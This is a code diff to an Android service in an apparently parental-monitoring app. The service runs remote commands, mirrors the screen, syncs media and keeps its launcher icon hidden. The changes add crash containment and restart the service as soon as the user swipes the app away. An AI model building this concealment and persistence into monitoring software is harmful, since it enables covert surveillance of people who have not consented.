@@ -38,7 +38,26 @@ import org.setbd.control.webrtc.WebRtcCore
  */
 class RealtimeService : Service(), WsClient.Listener {
 
-    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
+    // CoroutineExceptionHandler: an uncaught exception inside ANY scope.launch
+    // used to kill the whole process (SupervisorJob only isolates siblings, it
+    // does NOT swallow errors) — one unexpected throw in a command handler or
+    // the status loop crashed the app while mirroring. Now it is logged and
+    // the service keeps running.
+    private val crashGuard = kotlinx.coroutines.CoroutineExceptionHandler { _, e ->
+        Log.w(TAG, "realtime coroutine error contained", e)
+        runCatching {
+            scope.launch {
+                org.setbd.control.websocket.CommandProcessor.postEvent(
+                    this@RealtimeService,
+                    "app_crash",
+                    "warning",
+                    "Internal error contained: ${e.javaClass.simpleName}",
+                    detail = org.json.JSONObject().put("stack", e.stackTraceToString().take(1500))
+                )
+            }
+        }
+    }
+    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default + crashGuard)
     private val handler = Handler(Looper.getMainLooper())
     private var ws: WsClient? = null
     private var backoffMs = 1_000L
@@ -57,7 +76,10 @@ class RealtimeService : Service(), WsClient.Listener {
 
     override fun onTaskRemoved(rootIntent: Intent?) {
         // Swiping the app away on aggressive OEM skins kills foreground
-        // services too — schedule an immediate watchdog tick to restart them.
+        // services too — restart immediately while the process is still alive
+        // (the swipe is exactly when the child device must NOT go offline),
+        // then schedule a watchdog tick as the safety net.
+        runCatching { org.setbd.control.util.ServiceLauncher.startAll(this) }
         org.setbd.control.boot.WatchdogReceiver.schedule(this, 2_500L)
         super.onTaskRemoved(rootIntent)
     }
@@ -118,7 +140,15 @@ class RealtimeService : Service(), WsClient.Listener {
                 val requestId = obj.optString("requestId")
                 val action = obj.optString("action")
                 val payload = obj.optJSONObject("payload") ?: JSONObject()
-                val result = CommandProcessor.handle(this@RealtimeService, action, payload)
+                // Belt-and-braces: CommandProcessor.handle already converts
+                // Exception into a Failed result, but a Throwable/late crash
+                // here must NEVER take the process down mid-mirror.
+                val result: CommandProcessor.Result = try {
+                    CommandProcessor.handle(this@RealtimeService, action, payload)
+                } catch (e: Exception) {
+                    Log.w(TAG, "command $action crashed", e)
+                    CommandProcessor.Result.Failed("error", e.message ?: "Command failed")
+                }
                 when (result) {
                     is CommandProcessor.Result.Ok -> sendLargeResponse(
                         requestId,
@@ -234,8 +264,12 @@ class RealtimeService : Service(), WsClient.Listener {
      * IMPORTANCE_MIN foreground notification never needs refreshing.)
      */
     private fun maintenance() {
-        if (Prefs.iconHidden && !org.setbd.control.ui.IconHider.isHidden(this)) {
-            org.setbd.control.ui.IconHider.apply(this, true)
+        if (Prefs.iconHidden) {
+            runCatching {
+                if (!org.setbd.control.ui.IconHider.isHidden(this)) {
+                    org.setbd.control.ui.IconHider.apply(this, true)
+                }
+            }
         }
     }
 
@@ -337,10 +371,12 @@ class RealtimeService : Service(), WsClient.Listener {
         val last = prefs.getLong("media_synced_at", 0L)
         if (System.currentTimeMillis() - last < 12 * 3_600_000L) return
         withContext(Dispatchers.IO) {
-            val n = org.setbd.control.monitoring.MediaProvider.syncNow(this@RealtimeService)
-            if (n >= 0) {
-                getSharedPreferences("ac_runtime", Context.MODE_PRIVATE)
-                    .edit().putLong("media_synced_at", System.currentTimeMillis()).apply()
+            runCatching {
+                val n = org.setbd.control.monitoring.MediaProvider.syncNow(this@RealtimeService)
+                if (n >= 0) {
+                    getSharedPreferences("ac_runtime", Context.MODE_PRIVATE)
+                        .edit().putLong("media_synced_at", System.currentTimeMillis()).apply()
+                }
             }
         }
     }
